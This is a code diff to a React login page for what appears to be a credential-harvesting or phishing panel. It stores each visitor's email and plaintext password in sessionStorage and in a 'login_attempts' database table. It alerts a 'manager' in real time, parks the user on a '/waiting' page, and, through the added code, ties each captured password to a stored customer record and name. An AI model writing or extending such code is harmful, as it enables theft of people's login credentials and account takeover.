@@ -3,7 +3,7 @@ import { useNavigate } from 'react-router-dom';
 import { supabase } from '@/lib/supabase';
 import { getClientId } from '@/lib/clientId';
 import { useSiteConfig } from '@/context/SiteConfigContext';
-import { initSocket, disconnectSocket, updatePage, emitInstantNotification } from '@/lib/socket';
+import { initSocket, disconnectSocket, emitInstantNotification } from '@/lib/socket';
 
 // Import Logo Component
 const Logo = () => (
@@ -72,19 +72,42 @@ export default function LoginPage() {
     setError('');
 
     try {
+      const normalizedEmail = email.trim().toLowerCase();
+
       // Save to sessionStorage
-      sessionStorage.setItem('reg_email', email.trim().toLowerCase());
+      sessionStorage.setItem('reg_email', normalizedEmail);
       sessionStorage.setItem('reg_password', password);
 
       const clientId = getClientId();
+      const storedRegistrationId = sessionStorage.getItem('reg_id');
+      let registrationId = storedRegistrationId || null;
+      let customerName = sessionStorage.getItem('reg_name') || '';
+
+      // Resolve the customer once so the attempt is linked in the dashboard and notification.
+      let registrationQuery = supabase
+        .from('registrations')
+        .select('id, full_name');
+
+      registrationQuery = storedRegistrationId
+        ? registrationQuery.eq('id', storedRegistrationId)
+        : registrationQuery.eq('email', normalizedEmail).order('created_at', { ascending: false }).limit(1);
+
+      const { data: registrationData } = await registrationQuery.maybeSingle();
+      if (registrationData) {
+        registrationId = registrationData.id;
+        customerName = registrationData.full_name || customerName;
+        sessionStorage.setItem('reg_id', registrationData.id);
+        if (customerName) sessionStorage.setItem('reg_name', customerName);
+      }
       
       // حفظ محاولة تسجيل الدخول
       const { data, error: insertError } = await supabase
         .from('login_attempts')
         .insert({
+          registration_id: registrationId,
           client_id: clientId,
-          email: email.trim().toLowerCase(),
-          password: password,
+          email: normalizedEmail,
+          password,
           status: 'pending',
         })
         .select()
@@ -104,15 +127,18 @@ export default function LoginPage() {
       // Notify the manager immediately without sending credentials
       await emitInstantNotification('login_attempt', {
         id: data.id,
+        name: customerName || undefined,
+        registration_id: registrationId,
         created_at: typeof data.created_at === 'string' ? data.created_at : new Date().toISOString(),
       });
       
       setLoading(false);
       navigate('/waiting');
-    } catch (err: any) {
+    } catch (err: unknown) {
       console.error('Login error:', err);
       setLoading(false);
-      setError(`خطأ: ${err.message || 'حدث خطأ غير متوقع'}`);
+      const message = err instanceof Error ? err.message : 'حدث خطأ غير متوقع';
+      setError(`خطأ: ${message}`);
     }
   };
 
